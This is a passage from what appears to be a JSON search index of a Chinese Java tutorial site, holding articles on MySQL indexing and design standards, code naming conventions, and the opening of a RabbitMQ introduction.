：索引已经排序，这样查询可以利用索引的排序，加快排序查询时间。 被经常频繁用于连接的字段 ：经常用于连接的字段可能是一些外键列，对于外键列并不一定要建立外键，只是说该列涉及到表与表的关系。对于频繁被连接查询的字段，可以考虑建立索引，提高多表连接查询的效率。  2.被频繁更新的字段应该慎重建立索引。\n虽然索引能带来查询上的效率，但是维护索引的成本也是不小的。 如果一个字段不被经常查询，反而被经常修改，那么就更不应该在这种字段上建立索引了。\n3.尽可能的考虑建立联合索引而不是单列索引。\n因为索引是需要占用磁盘空间的，可以简单理解为每个索引都对应着一颗 B+树。如果一个表的字段过多，索引过多，那么当这个表的数据达到一个体量后，索引占用的空间也是很多的，且修改索引时，耗费的时间也是较多的。如果是联合索引，多个字段在一个索引上，那么将会节约很大磁盘空间，且修改数据的操作效率也会提升。\n4.注意避免冗余索引 。\n冗余索引指的是索引的功能相同，能够命中索引(a, b)就肯定能命中索引(a) ，那么索引(a)就是冗余索引。如（name,city ）和（name ）这两个索引就是冗余索引，能够命中前者的查询肯定是能够命中后者的 在大多数情况下，都应该尽量扩展已有的索引而不是创建新索引。\n5.考虑在字符串类型的字段上使用前缀索引代替普通索引。\n前缀索引仅限于字符串类型，较普通索引会占用更小的空间，所以可以考虑使用前缀索引带替普通索引。\n使用索引的一些建议     对于中到大型表索引都是非常有效的，但是特大型表的话维护开销会很大，不适合建索引 避免 where 子句中对字段施加函数，这会造成无法命中索引。 在使用 InnoDB 时使用与业务无关的自增主键作为主键，即使用逻辑主键，而不要使用业务主键。 删除长期未使用的索引，不用的索引的存在会造成不必要的性能损耗 MySQL 5.7 可以通过查询 sys 库的 schema_unused_indexes 视图来查询哪些索引从未被使用 在使用 limit offset 查询缓慢时，可以借助索引来提高性能  MySQL 如何为表字段添加索引？    1.添加 PRIMARY KEY（主键索引）\nALTER TABLE `table_name` ADD PRIMARY KEY ( `column` ) 2.添加 UNIQUE(唯一索引)\nALTER TABLE `table_name` ADD UNIQUE ( `column` ) 3.添加 INDEX(普通索引)\nALTER TABLE `table_name` ADD INDEX index_name ( `column` ) 4.添加 FULLTEXT(全文索引)\nALTER TABLE `table_name` ADD FULLTEXT ( `column`) 5.添加多列索引\nALTER TABLE `table_name` ADD INDEX index_name ( `column1`, `column2`, `column3` ) "},{"id":274,"href":"/database/mysql/MySQL%E9%AB%98%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E8%A7%84%E8%8C%83%E5%BB%BA%E8%AE%AE/","title":"MySQL高性能优化规范建议","parent":"mysql","content":" 作者: 听风，原文地址: https://www.cnblogs.com/huchong/p/10219318.html。JavaGuide 已获得作者授权。\n  数据库命令规范 数据库基本设计规范  1. 所有表必须使用 Innodb 存储引擎 2. 数据库和表的字符集统一使用 UTF8 3. 所有表和字段都需要添加注释 4. 尽量控制单表数据量的大小,建议控制在 500 万以内。 5. 谨慎使用 MySQL 分区表 6.尽量做到冷热数据分离,减小表的宽度 7. 禁止在表中建立预留字段 8. 禁止在数据库中存储图片,文件等大的二进制数据 9. 禁止在线上做数据库压力测试 10. 禁止从开发环境,测试环境直接连接生成环境数据库   数据库字段设计规范  1. 优先选择符合存储需要的最小的数据类型 2. 避免使用 TEXT,BLOB 数据类型，最常见的 TEXT 类型可以存储 64k 的数据 3. 避免使用 ENUM 类型 4. 尽可能把所有列定义为 NOT NULL 5. 使用 TIMESTAMP(4 个字节) 或 DATETIME 类型 (8 个字节) 存储时间 6. 同财务相关的金额类数据必须使用 decimal 类型   索引设计规范  1. 限制每张表上的索引数量,建议单张表索引不超过 5 个 2. 禁止给表中的每一列都建立单独的索引 3. 每个 Innodb 表必须有个主键 4. 常见索引列建议 5.如何选择索引列的顺序 6. 避免建立冗余索引和重复索引（增加了查询优化器生成执行计划的时间） 7. 对于频繁的查询优先考虑使用覆盖索引 8.索引 SET 规范   数据库 SQL 开发规范  1. 建议使用预编译语句进行数据库操作 2. 避免数据类型的隐式转换 3. 充分利用表上已经存在的索引 4. 数据库设计时，应该要对以后扩展进行考虑 5. 程序连接不同的数据库使用不同的账号，禁止跨库查询 6. 禁止使用 SELECT * 必须使用 SELECT \u0026lt;字段列表\u0026gt; 查询 7. 禁止使用不含字段列表的 INSERT 语句 8. 避免使用子查询，可以把子查询优化为 join 操作 9. 避免使用 JOIN 关联太多的表 10. 减少同数据库的交互次数 11. 对应同一列进行 or 判断时，使用 in 代替 or 12. 禁止使用 order by rand() 进行随机排序 13. WHERE 从句中禁止对列进行函数转换和计算 14. 在明显不会有重复值时使用 UNION ALL 而不是 UNION 15. 拆分复杂的大 SQL 为多个小 SQL   数据库操作行为规范  1. 超 100 万行的批量写 (UPDATE,DELETE,INSERT) 操作,要分批多次进行操作 2. 对于大表使用 pt-online-schema-change 修改表结构 3. 禁止为程序使用的账号赋予 super 权限 4. 对于程序连接数据库账号,遵循权限最小原则    数据库命令规范     所有数据库对象名称必须使用小写字母并用下划线分割 所有数据库对象名称禁止使用 MySQL 保留关键字（如果表名中包含关键字查询时，需要将其用单引号括起来） 数据库对象的命名要能做到见名识意，并且最后不要超过 32 个字符 临时库表必须以 tmp_为前缀并以日期为后缀，备份表必须以 bak_为前缀并以日期 (时间戳) 为后缀 所有存储相同数据的列名和列类型必须一致（一般作为关联列，如果查询时关联列类型不一致会自动进行数据类型隐式转换，会造成列上的索引失效，导致查询效率降低）   数据库基本设计规范    1. 所有表必须使用 Innodb 存储引擎    没有特殊要求（即 Innodb 无法满足的功能如：列存储，存储空间数据等）的情况下，所有表必须使用 Innodb 存储引擎（MySQL5.5 之前默认使用 Myisam，5.6 以后默认的为 Innodb）。\nInnodb 支持事务，支持行级锁，更好的恢复性，高并发下性能更好。\n2. 数据库和表的字符集统一使用 UTF8    兼容性更好，统一字符集可以避免由于字符集转换产生的乱码，不同的字符集进行比较前需要进行转换会造成索引失效，如果数据库中有存储 emoji 表情的需要，字符集需要采用 utf8mb4 字符集。\n参考文章：MySQL 字符集不一致导致索引失效的一个真实案例\n3. 所有表和字段都需要添加注释    使用 comment 从句添加表和列的备注，从一开始就进行数据字典的维护\n4. 尽量控制单表数据量的大小,建议控制在 500 万以内。    500 万并不是 MySQL 数据库的限制，过大会造成修改表结构，备份，恢复都会有很大的问题。\n可以用历史数据归档（应用于日志数据），分库分表（应用于业务数据）等手段来控制数据量大小\n5. 谨慎使用 MySQL 分区表    分区表在物理上表现为多个文件，在逻辑上表现为一个表；\n谨慎选择分区键，跨分区查询效率可能更低；\n建议采用物理分表的方式管理大数据。\n6.尽量做到冷热数据分离,减小表的宽度     MySQL 限制每个表最多存储 4096 列，并且每一行数据的大小不能超过 65535 字节。\n 减少磁盘 IO,保证热数据的内存缓存命中率（表越宽，把表装载进内存缓冲池时所占用的内存也就越大,也会消耗更多的 IO）；\n更有效的利用缓存，避免读入无用的冷数据；\n经常一起使用的列放到一个表中（避免更多的关联操作）。\n7. 禁止在表中建立预留字段    预留字段的命名很难做到见名识义。\n预留字段无法确认存储的数据类型，所以无法选择合适的类型。\n对预留字段类型的修改，会对表进行锁定。\n8. 禁止在数据库中存储图片,文件等大的二进制数据    通常文件很大，会短时间内造成数据量快速增长，数据库进行数据库读取时，通常会进行大量的随机 IO 操作，文件很大时，IO 操作很耗时。\n通常存储于文件服务器，数据库只存储文件地址信息\n9. 禁止在线上做数据库压力测试    10. 禁止从开发环境,测试环境直接连接生产环境数据库     数据库字段设计规范    1. 优先选择符合存储需要的最小的数据类型    原因：\n列的字段越大，建立索引时所需要的空间也就越大，这样一页中所能存储的索引节点的数量也就越少也越少，在遍历时所需要的 IO 次数也就越多，索引的性能也就越差。\n方法：\na.将字符串转换成数字类型存储,如:将 IP 地址转换成整形数据\nMySQL 提供了两个方法来处理 ip 地址\n inet_aton 把 ip 转为无符号整型 (4-8 位) inet_ntoa 把整型的 ip 转为地址  插入数据前，先用 inet_aton 把 ip 地址转为整型，可以节省空间，显示数据时，使用 inet_ntoa 把整型的 ip 地址转为地址显示即可。\nb.对于非负型的数据 (如自增 ID,整型 IP) 来说,要优先使用无符号整型来存储\n原因：\n无符号相对于有符号可以多出一倍的存储空间\nSIGNED INT -2147483648~2147483647 UNSIGNED INT 0~4294967295 VARCHAR(N) 中的 N 代表的是字符数，而不是字节数，使用 UTF8 存储 255 个汉字 Varchar(255)=765 个字节。过大的长度会消耗更多的内存。\n2. 避免使用 TEXT,BLOB 数据类型，最常见的 TEXT 类型可以存储 64k 的数据    a. 建议把 BLOB 或是 TEXT 列分离到单独的扩展表中\nMySQL 内存临时表不支持 TEXT、BLOB 这样的大数据类型，如果查询中包含这样的数据，在排序等操作时，就不能使用内存临时表，必须使用磁盘临时表进行。而且对于这种数据，MySQL 还是要进行二次查询，会使 sql 性能变得很差，但是不是说一定不能使用这样的数据类型。\n如果一定要使用，建议把 BLOB 或是 TEXT 列分离到单独的扩展表中，查询时一定不要使用 select * 而只需要取出必要的列，不需要 TEXT 列的数据时不要对该列进行查询。\n2、TEXT 或 BLOB 类型只能使用前缀索引\n因为MySQL 对索引字段长度是有限制的，所以 TEXT 类型只能使用前缀索引，并且 TEXT 列上是不能有默认值的\n3. 避免使用 ENUM 类型    修改 ENUM 值需要使用 ALTER 语句\nENUM 类型的 ORDER BY 操作效率低，需要额外操作\n禁止使用数值作为 ENUM 的枚举值\n4. 尽可能把所有列定义为 NOT NULL    原因：\n索引 NULL 列需要额外的空间来保存，所以要占用更多的空间\n进行比较和计算时要对 NULL 值做特别的处理\n5. 使用 TIMESTAMP(4 个字节) 或 DATETIME 类型 (8 个字节) 存储时间    TIMESTAMP 存储的时间范围 1970-01-01 00:00:01 ~ 2038-01-19-03:14:07\nTIMESTAMP 占用 4 字节和 INT 相同，但比 INT 可读性高\n超出 TIMESTAMP 取值范围的使用 DATETIME 类型存储\n经常会有人用字符串存储日期型的数据（不正确的做法）\n 缺点 1：无法用日期函数进行计算和比较 缺点 2：用字符串存储日期要占用更多的空间  6. 同财务相关的金额类数据必须使用 decimal 类型     非精准浮点：float,double 精准浮点：decimal  Decimal 类型为精准浮点数，在计算时不会丢失精度\n占用空间由定义的宽度决定，每 4 个字节可以存储 9 位数字，并且小数点要占用一个字节\n可用于存储比 bigint 更大的整型数据\n 索引设计规范    1. 限制每张表上的索引数量,建议单张表索引不超过 5 个    索引并不是越多越好！索引可以提高效率同样可以降低效率。\n索引可以增加查询效率，但同样也会降低插入和更新的效率，甚至有些情况下会降低查询效率。\n因为 MySQL 优化器在选择如何优化查询时，会根据统一信息，对每一个可以用到的索引来进行评估，以生成出一个最好的执行计划，如果同时有很多个索引都可以用于查询，就会增加 MySQL 优化器生成执行计划的时间，同样会降低查询性能。\n2. 禁止给表中的每一列都建立单独的索引    5.6 版本之前，一个 sql 只能使用到一个表中的一个索引，5.6 以后，虽然有了合并索引的优化方式，但是还是远远没有使用一个联合索引的查询方式好。\n3. 每个 Innodb 表必须有个主键    Innodb 是一种索引组织表：数据的存储的逻辑顺序和索引的顺序是相同的。每个表都可以有多个索引，但是表的存储顺序只能有一种。\nInnodb 是按照主键索引的顺序来组织表的\n 不要使用更新频繁的列作为主键，不适用多列主键（相当于联合索引） 不要使用 UUID,MD5,HASH,字符串列作为主键（无法保证数据的顺序增长） 主键建议使用自增 ID 值   4. 常见索引列建议     出现在 SELECT、UPDATE、DELETE 语句的 WHERE 从句中的列 包含在 ORDER BY、GROUP BY、DISTINCT 中的字段 并不要将符合 1 和 2 中的字段的列都建立一个索引， 通常将 1、2 中的字段建立联合索引效果更好 多表 join 的关联列   5.如何选择索引列的顺序    建立索引的目的是：希望通过索引进行数据查找，减少随机 IO，增加查询性能 ，索引能过滤出越少的数据，则从磁盘中读入的数据也就越少。\n 区分度最高的放在联合索引的最左侧（区分度=列中不同值的数量/列的总行数） 尽量把字段长度小的列放在联合索引的最左侧（因为字段长度越小，一页能存储的数据量越大，IO 性能也就越好） 使用最频繁的列放到联合索引的左侧（这样可以比较少的建立一些索引）   6. 避免建立冗余索引和重复索引（增加了查询优化器生成执行计划的时间）     重复索引示例：primary key(id)、index(id)、unique index(id) 冗余索引示例：index(a,b,c)、index(a,b)、index(a)   7. 对于频繁的查询优先考虑使用覆盖索引     覆盖索引：就是包含了所有查询字段 (where,select,order by,group by 包含的字段) 的索引\n 覆盖索引的好处：\n 避免 Innodb 表进行索引的二次查询: Innodb 是以聚集索引的顺序来存储的，对于 Innodb 来说，二级索引在叶子节点中所保存的是行的主键信息，如果是用二级索引查询数据的话，在查找到相应的键值后，还要通过主键进行二次查询才能获取我们真实所需要的数据。而在覆盖索引中，二级索引的键值中可以获取所有的数据，避免了对主键的二次查询 ，减少了 IO 操作，提升了查询效率。 可以把随机 IO 变成顺序 IO 加快查询效率: 由于覆盖索引是按键值的顺序存储的，对于 IO 密集型的范围查找来说，对比随机从磁盘读取每一行的数据 IO 要少的多，因此利用覆盖索引在访问时也可以把磁盘的随机读取的 IO 转变成索引查找的顺序 IO。   8.索引 SET 规范    尽量避免使用外键约束\n 不建议使用外键约束（foreign key），但一定要在表与表之间的关联键上建立索引 外键可用于保证数据的参照完整性，但建议在业务端实现 外键会影响父表和子表的写操作从而降低性能   数据库 SQL 开发规范    1. 建议使用预编译语句进行数据库操作    预编译语句可以重复使用这些计划，减少 SQL 编译所需要的时间，还可以解决动态 SQL 所带来的 SQL 注入的问题。\n只传参数，比传递 SQL 语句更高效。\n相同语句可以一次解析，多次使用，提高处理效率。\n2. 避免数据类型的隐式转换    隐式转换会导致索引失效如:\nselect name,phone from customer where id = '111'; 3. 充分利用表上已经存在的索引    避免使用双%号的查询条件。如：a like '%123%'，（如果无前置%,只有后置%，是可以用到列上的索引的）\n一个 SQL 只能利用到复合索引中的一列进行范围查询。如：有 a,b,c 列的联合索引，在查询条件中有 a 列的范围查询，则在 b,c 列上的索引将不会被用到。\n在定义联合索引时，如果 a 列要用到范围查找的话，就要把 a 列放到联合索引的右侧，使用 left join 或 not exists 来优化 not in 操作，因为 not in 也通常会使用索引失效。\n4. 数据库设计时，应该要对以后扩展进行考虑    5. 程序连接不同的数据库使用不同的账号，禁止跨库查询     为数据库迁移和分库分表留出余地 降低业务耦合度 避免权限过大而产生的安全风险  6. 禁止使用 SELECT * 必须使用 SELECT \u0026lt;字段列表\u0026gt; 查询    原因：\n 消耗更多的 CPU 和 IO 以网络带宽资源 无法使用覆盖索引 可减少表结构变更带来的影响  7. 禁止使用不含字段列表的 INSERT 语句    如：\ninsert into values ('a','b','c'); 应使用：\ninsert into t(c1,c2,c3) values ('a','b','c'); 8. 避免使用子查询，可以把子查询优化为 join 操作    通常子查询在 in 子句中，且子查询中为简单 SQL(不包含 union、group by、order by、limit 从句) 时,才可以把子查询转化为关联查询进行优化。\n子查询性能差的原因：\n子查询的结果集无法使用索引，通常子查询的结果集会被存储到临时表中，不论是内存临时表还是磁盘临时表都不会存在索引，所以查询性能会受到一定的影响。特别是对于返回结果集比较大的子查询，其对查询性能的影响也就越大。\n由于子查询会产生大量的临时表也没有索引，所以会消耗过多的 CPU 和 IO 资源，产生大量的慢查询。\n9. 避免使用 JOIN 关联太多的表    对于 MySQL 来说，是存在关联缓存的，缓存的大小可以由 join_buffer_size 参数进行设置。\n在 MySQL 中，对于同一个 SQL 多关联（join）一个表，就会多分配一个关联缓存，如果在一个 SQL 中关联的表越多，所占用的内存也就越大。\n如果程序中大量的使用了多表关联的操作，同时 join_buffer_size 设置的也不合理的情况下，就容易造成服务器内存溢出的情况，就会影响到服务器数据库性能的稳定性。\n同时对于关联操作来说，会产生临时表操作，影响查询效率，MySQL 最多允许关联 61 个表，建议不超过 5 个。\n10. 减少同数据库的交互次数    数据库更适合处理批量操作，合并多个相同的操作到一起，可以提高处理效率。\n11. 对应同一列进行 or 判断时，使用 in 代替 or    in 的值不要超过 500 个，in 操作可以更有效的利用索引，or 大多数情况下很少能利用到索引。\n12. 禁止使用 order by rand() 进行随机排序    order by rand() 会把表中所有符合条件的数据装载到内存中，然后在内存中对所有数据根据随机生成的值进行排序，并且可能会对每一行都生成一个随机值，如果满足条件的数据集非常大，就会消耗大量的 CPU 和 IO 及内存资源。\n推荐在程序中获取一个随机值，然后从数据库中获取数据的方式。\n13. WHERE 从句中禁止对列进行函数转换和计算    对列进行函数转换或计算时会导致无法使用索引\n不推荐：\nwhere date(create_time)='20190101' 推荐：\nwhere create_time \u0026gt;= '20190101' and create_time \u0026lt; '20190102' 14. 在明显不会有重复值时使用 UNION ALL 而不是 UNION     UNION 会把两个结果集的所有数据放到临时表中后再进行去重操作 UNION ALL 不会再对结果集进行去重操作  15. 拆分复杂的大 SQL 为多个小 SQL     大 SQL 逻辑上比较复杂，需要占用大量 CPU 进行计算的 SQL MySQL 中，一个 SQL 只能使用一个 CPU 进行计算 SQL 拆分后可以通过并行执行来提高处理效率   数据库操作行为规范    1. 超 100 万行的批量写 (UPDATE,DELETE,INSERT) 操作,要分批多次进行操作    大批量操作可能会造成严重的主从延迟\n主从环境中,大批量操作可能会造成严重的主从延迟，大批量的写操作一般都需要执行一定长的时间， 而只有当主库上执行完成后，才会在其他从库上执行，所以会造成主库与从库长时间的延迟情况\nbinlog 日志为 row 格式时会产生大量的日志\n大批量写操作会产生大量日志，特别是对于 row 格式二进制数据而言，由于在 row 格式中会记录每一行数据的修改，我们一次修改的数据越多，产生的日志量也就会越多，日志的传输和恢复所需要的时间也就越长，这也是造成主从延迟的一个原因\n避免产生大事务操作\n大批量修改数据，一定是在一个事务中进行的，这就会造成表中大批量数据进行锁定，从而导致大量的阻塞，阻塞会对 MySQL 的性能产生非常大的影响。\n特别是长时间的阻塞会占满所有数据库的可用连接，这会使生产环境中的其他应用无法连接到数据库，因此一定要注意大批量写操作要进行分批\n2. 对于大表使用 pt-online-schema-change 修改表结构     避免大表修改产生的主从延迟 避免在对表字段进行修改时进行锁表  对大表数据结构的修改一定要谨慎，会造成严重的锁表操作，尤其是生产环境，是不能容忍的。\npt-online-schema-change 它会首先建立一个与原表结构相同的新表，并且在新表上进行表结构的修改，然后再把原表中的数据复制到新表中，并在原表中增加一些触发器。把原表中新增的数据也复制到新表中，在行所有数据复制完成之后，把新表命名成原表，并把原来的表删除掉。把原来一个 DDL 操作，分解成多个小的批次进行。\n3. 禁止为程序使用的账号赋予 super 权限     当达到最大连接数限制时，还运行 1 个有 super 权限的用户连接 super 权限只能留给 DBA 处理问题的账号使用  4. 对于程序连接数据库账号,遵循权限最小原则     程序使用数据库账号只能在一个 DB 下使用，不准跨库 程序使用的账号原则上不准有 drop 权限  "},{"id":275,"href":"/system-design/naming/","title":"naming","parent":"system-design","content":" 可选标题：工作半年，变量命名不规范，被diss了！\n项目组新来的实习生因为变量命名被 “diss” 了！\n 大家好，这里是热爱分享的 Guide ！\n我还记得我刚工作那一段时间， 项目 Code Review 的时候，我经常因为变量命名不规范而被 “diss”!\n究其原因还是自己那会经验不足，而且，大学那会写项目的时候不太注意这些问题，想着只要把功能实现出来就行了。\n但是，工作中就不一样，为了代码的可读性、可维护性，项目组对于代码质量的要求还是很高的！\n前段时间，项目组新来的一个实习生也经常在 Code Review 因为变量命名不规范而被 “diss”，这让我想到自己刚到公司写代码那会的日子。\n于是，我就简单写了这篇关于变量命名规范的文章，希望能对同样有此困扰的小伙伴提供一些帮助。\n确实，编程过程中，有太多太多让我们头疼的事情了，比如命名、维护其他人的代码、写测试、与其他人沟通交流等等。\n据说之前在 Quora 网站，由接近 5000 名程序员票选出来的最难的事情就是“命名”。\n大名鼎鼎的《重构》的作者老马（Martin Fowler）曾经在TwoHardThings这篇文章中提到过CS 领域有两大最难的事情：一是 缓存失效 ，一是 程序命名 。\n这个句话实际上也是老马引用别人的，类似的表达还有很多。比如分布式系统领域有两大最难的事情：一是 保证消息顺序 ，一是 严格一次传递 。\n今天咱们就单独拎出 “命名” 来聊聊！\n这篇文章配合我之前发的 《编码 5 分钟，命名 2 小时？史上最全的 Java 命名规范参考！》 这篇文章阅读效果更佳哦！\n为什么需要重视命名？    咱们需要先搞懂为什么要重视编程中的命名这一行为，它对于我们的编码工作有着什么意义。\n为什么命名很重要呢？ 这是因为 好的命名即是注释，别人一看到你的命名就知道你的变量、方法或者类是做什么的！\n简单来说就是 别人根据你的命名就能知道你的代码要表达的意思 （不过，前提这个人也要有基本的英语知识，对于一些编程中常见的单词比较熟悉）。\n简单举个例子说明一下命名的重要性。\n《Clean Code》这本书明确指出：\n 好的代码本身就是注释，我们要尽量规范和美化自己的代码来减少不必要的注释。\n若编程语言足够有表达力，就不需要注释，尽量通过代码来阐述。\n举个例子：\n去掉下面复杂的注释，只需要创建一个与注释所言同一事物的函数即可\n// check to see if the employee is eligible for full benefits if ((employee.flags \u0026amp; HOURLY_FLAG) \u0026amp;\u0026amp; (employee.age \u0026gt; 65)) 应替换为\nif (employee.isEligibleForFullBenefits())  常见命名规则以及适用场景    这里只介绍 3 种最常见的命名规范。\n驼峰命名法（CamelCase）    驼峰命名法应该我们最常见的一个，这种命名方式使用大小写混合的格式来区别各个单词，并且单词之间不使用空格隔开或者连接字符连接的命名方式\n大驼峰命名法（UpperCamelCase）    类名需要使用大驼峰命名法（UpperCamelCase）\n正例：\nServiceDiscovery、ServiceInstance、LruCacheFactory 反例：\nserviceDiscovery、Serviceinstance、LRUCacheFactory 小驼峰命名法（lowerCamelCase）    方法名、参数名、成员变量、局部变量需要使用小驼峰命名法（lowerCamelCase）。\n正例：\ngetUserInfo() createCustomThreadPool() setNameFormat(String nameFormat) Uservice userService; 反例：\nGetUserInfo()、CreateCustomThreadPool()、setNameFormat(String NameFormat) Uservice user_service 蛇形命名法（snake_case）    测试方法名、常量、枚举名称需要使用蛇形命名法（snake_case）\n在蛇形命名法中，各个单词之间通过下划线“_”连接，比如should_get_200_status_code_when_request_is_valid、CLIENT_CONNECT_SERVER_FAILURE。\n蛇形命名法的优势是命名所需要的单词比较多的时候，比如我把上面的命名通过小驼峰命名法给大家看一下：“shouldGet200StatusCodeWhenRequestIsValid”。\n感觉如何？ 相比于使用蛇形命名法（snake_case）来说是不是不那么易读？\n正例：\n@Test void should_get_200_status_code_when_request_is_valid() { ...... } 反例：\n@Test void shouldGet200StatusCodeWhenRequestIsValid() { ...... } 串式命名法（kebab-case）    在串式命名法中，各个单词之间通过连接符“-”连接，比如dubbo-registry。\n建议项目文件夹名称使用串式命名法（kebab-case），比如 dubbo 项目的各个模块的命名是下面这样的。\n常见命名规范    Java 语言基本命名规范    1、类名需要使用大驼峰命名法（UpperCamelCase）风格。方法名、参数名、成员变量、局部变量需要使用小驼峰命名法（lowerCamelCase）。\n2、测试方法名、常量、枚举名称需要使用蛇形命名法（snake_case），比如should_get_200_status_code_when_request_is_valid、CLIENT_CONNECT_SERVER_FAILURE。并且，测试方法名称要求全部小写，常量以及枚举名称需要全部大写。\n3、项目文件夹名称使用串式命名法（kebab-case），比如dubbo-registry。\n4、包名统一使用小写，尽量使用单个名词作为包名，各个单词通过 \u0026ldquo;.\u0026rdquo; 分隔符连接，并且各个单词必须为单数。\n正例： org.apache.dubbo.common.threadlocal\n反例： org.apache_dubbo.Common.threadLocals\n5、抽象类命名使用 Abstract 开头。\n//为远程传输部分抽象出来的一个抽象类（出处：Dubbo源码） public abstract class AbstractClient extends AbstractEndpoint implements Client { } 6、异常类命名使用 Exception 结尾。\n//自定义的 NoSuchMethodException（出处：Dubbo源码） public class NoSuchMethodException extends RuntimeException { private static final long serialVersionUID = -2725364246023268766L; public NoSuchMethodException() { super(); } public NoSuchMethodException(String msg) { super(msg); } } 7、测试类命名以它要测试的类的名称开始，以 Test 结尾。\n//为 AnnotationUtils 类写的测试类（出处：Dubbo源码） public class AnnotationUtilsTest { ...... } POJO 类中布尔类型的变量，都不要加 is 前缀，否则部分框架解析会引起序列化错误。\n如果模块、接口、类、方法使用了设计模式，在命名时需体现出具体模式。\n命名易读性规范    1、为了能让命名更加易懂和易读，尽量不要缩写/简写单词，除非这些单词已经被公认可以被这样缩写/简写。比如 CustomThreadFactory 不可以被写成 ~~CustomTF 。\n2、命名不像函数一样要尽量追求短，可读性强的名字优先于简短的名字，虽然可读性强的名字会比较长一点。 这个对应我们上面说的第 1 点。\n3、避免无意义的命名，你起的每一个名字都要能表明意思。\n正例：UserService userService; int userCount;\n反例: UserService service int count\n4、避免命名过长（50 个字符以内最好），过长的命名难以阅读并且丑陋。\n5、不要使用拼音，更不要使用中文。 不过像 alibaba 、wuhan、taobao 这种国际通用名词可以当做英文来看待。\n正例：discount\n反例：dazhe\nCodelf:变量命名神器?    这是一个由国人开发的网站，网上有很多人称其为变量命名神器， 我在实际使用了几天之后感觉没那么好用。小伙伴们可以自行体验一下，然后再给出自己的判断。\nCodelf 提供了在线网站版本，网址：https://unbug.github.io/codelf/，具体使用情况如下：\n我选择了 Java 编程语言，然后搜索了“序列化”这个关键词，然后它就返回了很多关于序列化的命名。\n并且，Codelf 还提供了 VS code 插件，看这个评价，看来大家还是很喜欢这款命名工具的。\n相关阅读推荐     《阿里巴巴 Java 开发手册》 《Clean Code》 Google Java 代码指南：https://google.github.io/styleguide/javaguide.html#s5.1-identifier-name 告别编码5分钟，命名2小时！史上最全的Java命名规范参考：https://www.cnblogs.com/liqiangchn/p/12000361.html  总结    作为一个合格的程序员，小伙伴们应该都知道代码表义的重要性。想要写出高质量代码，好的命名就是第一步！\n好的命名对于其他人（包括你自己）理解你的代码有着很大的帮助！你的代码越容易被理解，可维护性就越强，侧面也就说明你的代码设计的也就越好！\n在日常编码过程中，我们需要谨记常见命名规范比如类名需要使用大驼峰命名法、不要使用拼音，更不要使用中文\u0026hellip;\u0026hellip;。\n另外，国人开发的一个叫做 Codelf 的网站被很多人称为“变量命名神器”，当你为命名而头疼的时候，你可以去参考一下上面提供的一些命名示例。\n最后，祝愿大家都不用再为命名而困扰!\n"},{"id":276,"href":"/system-design/distributed-system/message-queue/RabbitMQ%E5%85%A5%E9%97%A8%E7%9C%8B%E8%BF%99%E4%B8%80%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86/","title":"RabbitMQ入门看这一篇就够了","parent":"message-queue","content":" 一文搞懂 RabbitMQ 的重要概念以及安装  一 RabbitMQ 介绍  1.1 RabbitMQ 简介 1.2 RabbitMQ 核心概念  1.2.1 Producer(生产者) 和 Consumer(消费者) 1.2.2 Exchange(交换器) 1.2.3 Queue(消息队列) 1.2.4 Broker（消息中间件的服务节点） 1.2.5 Exchange Types(交换器类型)  ① fanout ② direct ③ topic ④ headers(不推荐)       二 安装 RabbitMq  2.1 安装 erlang 2.2 安装 RabbitMQ      一文搞懂 RabbitMQ 的重要概念以及安装    一 RabbitMQ 介绍    这部分参考了 《RabbitMQ实战指南》这本书的第 1 章和第 2 章。\n1.1 RabbitMQ 简介    RabbitMQ 是采用 Erlang 语言实现 AMQP(Advanced Message Queuing Protocol，高级消息队列协议）的消息中间件，它最初起源于金融系统，用于在分布式系统中存储转发消息。\nRabbitMQ 发展到今天，被越来越多的人认可，这和它在易用性、扩展性、可靠性和高可用性等方面的卓著表现是分不开的。RabbitMQ 的具体特点可以概括为以下几点：\n 可靠性： RabbitMQ使用一些机制来保证消息的可靠性，如持久化、传输确认及发布确认等。 灵活的路由： 在消息进入队列之前，通过交换器来路由消息。对于典型的路由功能，RabbitMQ 己经提供了一些内置的交换器来实现。针对更复杂的路由功能，可以将多个交换器绑定在一起，也可以通过插件机制来实现自己的交换器。这个后面会在我们讲 RabbitMQ 核心概念的时候详细介绍到。 扩展性： 多个RabbitMQ节点可以组成一个集群，也可以根据实际业务情况动态地扩展集群中节点。 高可用性： 队列可以在集群中的机器上设置镜像，使得在部分节点出现问题的情况下队列仍然可用。 支持多种协议： RabbitMQ 除了原生支持 AMQP 协议，还支持 STOMP、MQTT 等多种消息中间件协议。 多语言客户端： RabbitMQ几乎支持所有常用语言，比如 Java、Python、Ruby、PHP、C#、JavaScript等。 易用的管理界面： RabbitMQ提供了一个易用的用户界面，使得用户可以监控和管理消息、集群中的节点等。在安装 RabbitMQ 的时候会介绍到，安装好 RabbitMQ 就自带管理界面。 插件机制： RabbitMQ 提供了许多插件，以实现从多方面进行扩展，当然也可以编写自己的插件。感觉这个有点类似 Dubbo 的 SPI机制。  1.2 RabbitMQ 核心概念    RabbitMQ 整体上是一个生产者与消费者模型，主要负责接收、存储和转发消息。可以把消息传递的过程想象成：当你将一个包裹送到邮局，邮局会暂存并最终将邮件通过邮递员送到收件人的手上，RabbitMQ就好比由邮局、邮箱和邮递员组成的一个系统。从计算机术语层面来说，RabbitMQ 模型更像是一种交换机模型。\n下面再来看看图1—— RabbitMQ 的整体模型架构。\n下面我会一一介绍上图中的一些概念。\n1.2.1 Producer(生产者) 和 Consumer(消费者)     Producer(生产者) :生产消息的一方（邮件投递者） Consumer(消费者) :消费消息的一方（邮件收件人）  消息一般由 2 部分组成：消息头（或者说是标签 Label）和 消息体。消息体也可以称为 payLoad ,消息体是不透明的，而消息头则由一系列的可选属性组成，这些属性包括 routing-key（路由键）、priority（相对于其他消息的优先权）、delivery-mode（指出该消息可能需要持久性存储）等。生产者把消息交由 RabbitMQ 后，RabbitMQ 会根据消息头把消息发送给感兴趣的 Consumer(消费者)。\n1.2.2 Exchange(交换器)    在 RabbitMQ 中，消息并不是直接被投递到 Queue(消息队列) 中的，中间还必须经过 Exchange(交换器) 这一层，Exchange(交换器) 会把我们的消息分配到对应的 Queue(消息队列) 中。\nExchange(交换器) 用来接收生产者发送的消息并将这些消息路由给服务器中的队列中，如果路由不到，或许会返回给 Producer(生产者) ，或许会被直接丢弃掉 。这里可以将RabbitMQ中的交换器看作一个简单的实体。\nRabbitMQ 的 Exchange(交换器) 有4种类型，不同的类型对应着不同的路由策略：direct(默认)，fanout, topic, 和 